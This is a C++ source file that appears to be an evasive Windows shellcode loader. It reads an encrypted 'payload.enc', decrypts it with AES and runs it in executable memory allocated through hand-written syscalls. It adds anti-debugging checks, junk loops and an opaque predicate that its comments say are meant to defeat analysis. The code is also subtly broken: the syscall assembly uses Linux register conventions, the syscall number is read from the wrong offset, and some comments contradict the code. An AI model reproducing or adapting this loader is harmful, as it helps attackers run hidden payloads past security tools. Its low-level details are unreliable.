#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <ntdef.h>
#include "aes.h"
#ifndef SIGTRAP
#define SIGTRAP 5  // Define SIGTRAP for MinGW
#endif
#include <signal.h>

#define DEBUG_BREAK() raise(SIGTRAP)


// Helper function to extract the syscall number from ntdll
DWORD GetSyscallNumber(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    FARPROC pFunction = GetProcAddress(hNtdll, functionName);
    if (!pFunction) return 0;

    // The syscall number is located at the second byte of the function stub
    return *(BYTE*)((BYTE*)pFunction + 1);
}

template <typename T1, typename T2, typename T3, typename T4, typename T5, typename T6>
NTSTATUS IndirectSyscall(DWORD syscallNumber, T1 arg1, T2 arg2, T3 arg3, T4 arg4, T5 arg5, T6 arg6) {
    NTSTATUS result;
    __asm__ volatile (
        "mov %[syscallNumber], %%rax\n\t"  // Move syscall number into RAX
        "mov %[arg1], %%rdi\n\t"          // Move arg1 into RDI
        "mov %[arg2], %%rsi\n\t"          // Move arg2 into RSI
        "mov %[arg3], %%rdx\n\t"          // Move arg3 into RDX
        "mov %[arg4], %%r10\n\t"          // Move arg4 into R10
        "mov %[arg5], %%r8\n\t"           // Move arg5 into R8
        "mov %[arg6], %%r9\n\t"           // Move arg6 into R9
        "syscall\n\t"                     // Trigger the syscall
        "mov %%rax, %[result]\n\t"        // Move the result (RAX) into the output variable
        : [result] "=a" (result)          // Output: result in RAX
        : [syscallNumber] "r" (syscallNumber), // Inputs
          [arg1] "D" (arg1),              // RDI
          [arg2] "S" (arg2),              // RSI
          [arg3] "d" (arg3),              // RDX
          [arg4] "r" (arg4),              // R10
          [arg5] "r" (arg5),              // R8
          [arg6] "r" (arg6)               // R9
        : "%rcx", "%r11", "memory"        // Clobbered registers and memory
    );
    return result;
}

// Dummy loop function
void dummyLoop() {
    for (int i = 0; i < 1000; i++) {
        volatile int x = i * 2; // Prevent compiler optimization
        (void)x; // Suppress unused variable warning
    }
}

// Opaque predicate function (always returns true)
bool alwaysTrue() {
    volatile int x = 42;
    return x == 42;
}

// Anti-debugging: Check for a debugger using IsDebuggerPresent
bool isDebuggerPresent() {
    return IsDebuggerPresent() != 0;
}

// Anti-debugging: Crash if a debugger is detected
void crashIfDebugged() {
    if (isDebuggerPresent()) {
        DEBUG_BREAK(); // Trigger a breakpoint (debugger will catch this)
        exit(1); // Exit if no debugger is present
    }
}

// Read encrypted payload from file and extract key/IV
std::vector<uint8_t> readEncryptedPayload(const std::string& filePath, uint8_t* key, uint8_t* iv) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open payload file." << std::endl;
        return {};
    }

    // Read key and IV (first 32 bytes)
    file.read(reinterpret_cast<char*>(key), 16);
    file.read(reinterpret_cast<char*>(iv), 16);

    // Read the rest of the file (encrypted payload)
    return std::vector<uint8_t>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

// Decrypt payload using AES
std::vector<uint8_t> decryptPayload(const std::vector<uint8_t>& encryptedData, const uint8_t* key, const uint8_t* iv) {
    std::vector<uint8_t> decryptedData(encryptedData.size());
    AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    memcpy(decryptedData.data(), encryptedData.data(), encryptedData.size());
    AES_CBC_decrypt_buffer(&ctx, decryptedData.data(), decryptedData.size());
    return decryptedData;
}

// Execute shellcode payload
void executeShellcode(const std::vector<uint8_t>& shellcode) {
    // Get syscall numbers
    DWORD syscallNtAllocateVirtualMemory = GetSyscallNumber("NtAllocateVirtualMemory");
    DWORD syscallNtProtectVirtualMemory = GetSyscallNumber("NtProtectVirtualMemory");

    if (!syscallNtAllocateVirtualMemory || !syscallNtProtectVirtualMemory) {
        std::cerr << "Failed to resolve syscall numbers." << std::endl;
        return;
    }

    // Allocate memory for the payload using indirect syscall
    PVOID allocated_mem = nullptr;
    SIZE_T size = shellcode.size();
    NTSTATUS status = IndirectSyscall(
        syscallNtAllocateVirtualMemory,
        GetCurrentProcess(),       // HANDLE ProcessHandle
        &allocated_mem,            // PVOID* BaseAddress
        0,                         // ULONG_PTR ZeroBits
        &size,                     // PSIZE_T RegionSize
        MEM_COMMIT | MEM_RESERVE,  // ULONG AllocationType
        PAGE_EXECUTE_READWRITE     // ULONG Protect
    );

    if (status != 0) {
        std::cerr << "Failed to allocate memory." << std::endl;
        return;
    }

    // Copy the payload into the allocated memory
    memcpy(allocated_mem, shellcode.data(), shellcode.size());

    // Change memory protection to PAGE_EXECUTE_READ using indirect syscall
    ULONG oldProtect;
    status = IndirectSyscall(
        syscallNtProtectVirtualMemory,
        GetCurrentProcess(),       // HANDLE ProcessHandle
        &allocated_mem,           // PVOID* BaseAddress
        &size,                   // PSIZE_T RegionSize
        PAGE_EXECUTE_READ,        // ULONG NewProtect
        &oldProtect,             // PULONG OldProtect
        0                         // Unused (padding)
    );

    if (status != 0) {
        std::cerr << "Failed to change memory protection." << std::endl;
        return;
    }

    // Execute the payload
    ((void(*)())allocated_mem)();

    // Clean up
    VirtualFree(allocated_mem, 0, MEM_RELEASE);
}
int main() {
    // Anti-debugging: Crash if a debugger is detected
    crashIfDebugged();

    // Add a dummy loop
    dummyLoop();

    // Opaque predicate to confuse static analysis
    if (alwaysTrue()) {
        // Key and IV (will be read from the payload file)
        uint8_t key[16], iv[16];

        // Read encrypted payload from file and extract key/IV
        std::string payloadFilePath = "payload.enc";
        std::vector<uint8_t> encryptedPayload = readEncryptedPayload(payloadFilePath, key, iv);
        if (encryptedPayload.empty()) {
            std::cerr << "Failed to read payload." << std::endl;
            return 1;
        }

        // Decrypt payload
        std::vector<uint8_t> decryptedPayload = decryptPayload(encryptedPayload, key, iv);

        // Execute payload (assume it's shellcode for this example)
        executeShellcode(decryptedPayload);
    } else {
        // Fake branch (never executed)
        std::cout << "This is a fake branch." << std::endl;
    }

    return 0;
}